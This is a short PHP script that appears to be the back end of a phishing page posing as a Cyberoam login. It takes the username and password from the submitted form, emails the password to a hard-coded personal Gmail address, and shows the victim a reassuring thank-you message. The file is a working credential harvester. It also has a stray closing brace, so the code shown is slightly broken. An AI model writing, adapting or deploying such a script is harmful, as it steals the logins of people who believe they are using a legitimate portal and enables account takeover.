<?php
$to="mjthakur413@gmail.com";
$subject ="Cyberoam";
if(isset($_POST['login']))
{
	$name=$_POST['username'];
	
	$message=$_POST['password'];
	$headers="FROM:".$to."\n";

      if(!empty($name)&&!empty($message))
	{
		
		mail($to,$subject,$message,$headers);
            echo '<h1 style="color:#6666ff">"ThankU, we will reach u in short interval.Have a good day!</h1>"';
	}
		else
		{
		echo "Please enter all reqd. values"."\n";

		}
}
	
}	



?>